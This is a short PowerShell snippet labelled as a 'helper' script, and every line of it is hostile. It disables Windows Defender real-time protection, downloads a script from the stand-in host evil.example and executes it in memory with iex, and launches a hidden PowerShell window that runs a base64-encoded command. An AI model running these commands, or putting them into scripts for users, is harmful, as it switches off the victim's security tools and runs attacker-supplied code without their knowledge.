# "helper" script
Set-MpPreference -DisableRealtimeMonitoring $true
iwr https://evil.example/a.ps1 | iex
powershell -nop -w hidden -enc SQBFAFgAIABKAGEAdgBhAFMAYwByAGkAcAB0ACAAUABhAHkAbABvAGEAZAAgAGYAbwByACAAdABlAHMAdABpAG4AZwAgAG8AbgBsAHkA
